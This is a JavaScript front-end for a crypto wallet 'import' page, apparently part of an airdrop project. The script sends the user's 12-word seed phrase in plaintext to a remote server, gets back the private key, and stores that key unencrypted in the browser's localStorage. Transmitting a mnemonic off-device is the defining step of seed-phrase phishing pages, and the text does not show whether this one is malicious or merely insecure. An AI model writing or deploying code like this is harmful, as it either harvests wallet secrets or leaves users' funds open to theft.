const seedInput = document.getElementById('seedInput');
const importBtn = document.getElementById('importBtn');
const importStatus = document.getElementById('importStatus');
const goToDashboardBtn = document.getElementById('goToDashboardBtn');

importBtn.addEventListener('click', async () => {
  const seed = seedInput.value.trim();

  if (!seed || seed.split(' ').length !== 12) {
      importStatus.textContent = 'Please enter a valid 12-word seed phrase.';
      return;
  }

  importStatus.textContent = 'Importing...';

  try {
      const res = await fetch('https://airdrop-sunaryum.onrender.com/api/wallet/import', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ mnemonic: seed })
      });

      if (!res.ok) {
          throw new Error('Server responded with an error.');
      }

      const data = await res.json();

      const walletData = {
        address: data.address,        // ✅ Remove .data extra
        public_key: data.public_key,
        private_key: data.private_key
    };

      localStorage.setItem('walletData', JSON.stringify(walletData));

      importStatus.innerHTML = `
          <span style="color: #00ff88;">
              ✅ Wallet imported!<br>
          </span>
      `;

      goToDashboardBtn.classList.remove('hidden');

  } catch (error) {
      console.error(error);
      importStatus.textContent = 'Failed to import wallet. Check your seed phrase.';
  }
});

// 👉 agora sim, redireciona ao clicar
goToDashboardBtn.addEventListener('click', () => {
  window.location.href = 'dashboard.html'; // ajuste se o nome for diferente
});
